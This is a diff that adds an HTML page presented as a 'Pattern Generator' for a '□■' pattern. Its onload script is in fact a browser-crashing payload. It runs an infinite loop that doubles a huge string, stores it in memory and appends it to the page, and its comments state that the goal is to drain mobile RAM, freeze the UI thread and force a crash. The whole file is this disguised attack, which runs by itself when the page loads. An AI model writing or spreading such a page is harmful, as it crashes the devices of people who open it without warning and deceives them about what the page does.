@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pattern Generator</title>
+    <style>
+        body {
+            background-color: #111;
+            color: #fff;
+            font-family: monospace;
+            padding: 20px;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Loading Requested Pattern Sequence...</h1>
+    <p>Attempting to loop "□■" to requested dimensions...</p>
+
+    <script>
+        // This function executes immediately when the page opens
+        window.onload = function() {
+            const pattern = "□■";
+            let heavyString = pattern.repeat(500000); // Create a heavy baseline string
+            let memoryDrain = [];
+
+            // Infinite loop to rapidly drain mobile RAM and force a browser crash
+            while (true) {
+                // Continuously append huge blocks of text to an array
+                memoryDrain.push(heavyString);
+                
+                // Simultaneously force the browser to try and render it to the screen,
+                // which completely freezes the UI thread on mobile devices.
+                const div = document.createElement('div');
+                div.textContent = heavyString;
+                document.body.appendChild(div);
+                
+                // Multiply the string size exponentially to speed up the crash
+                heavyString += heavyString; 
+            }
+        };
+    </script>
+
+</body>
+</html>
